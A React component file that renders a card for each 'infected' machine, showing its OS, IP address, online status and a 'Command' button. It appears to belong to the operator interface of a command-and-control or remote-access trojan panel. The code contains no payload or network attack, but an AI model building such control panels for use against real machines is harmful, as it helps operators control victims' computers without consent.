import React from "react"
import type { Infected } from "../types/infected.ts";

type Props = {
    infected: Infected,
    command: () => void
}
import { IoLogoWindows } from "react-icons/io5";
import { FaLinux } from "react-icons/fa6";
export const InfectedCard: React.FC<Props> = (props) => {

    /**
     * The indicator will change his color, due to the connectivity
     */
    return (
        <>
            <div className="card bg-base-100 w-60 shadow-sm">
                <div className="card-body">
                    <p>{["Windows", "Windumb"].includes(props.infected?.osType)
                        ? <IoLogoWindows className={"w-40 h-40"} />
                        : <FaLinux className={"w-40 h-40"} />}
                    </p>
                    <div className="flex items-center justify-between gap-5">
                        <h2 className="card-title text-lg font-mono">{props.infected.latestIpAddress}</h2>
                        {
                            props.infected.online
                            ? <span className="font-mono p-1 bg-green-400 rounded-md text-white">Online</span>
                            : <span className="font-mono p-1 bg-slate-400 rounded-md text-white">Offline</span>
                        }
                    </div>
                    <p>{props.infected?.osType} {props.infected.osEdition}</p>
                    <div className="card-actions justify-start">
                        <button className={`btn ${props.infected.online ? 'btn-primary' : 'btn-disabled'}`} onClick={props.command}>Command</button>
                    </div>
                </div>
            </div>
        </>
    )
}
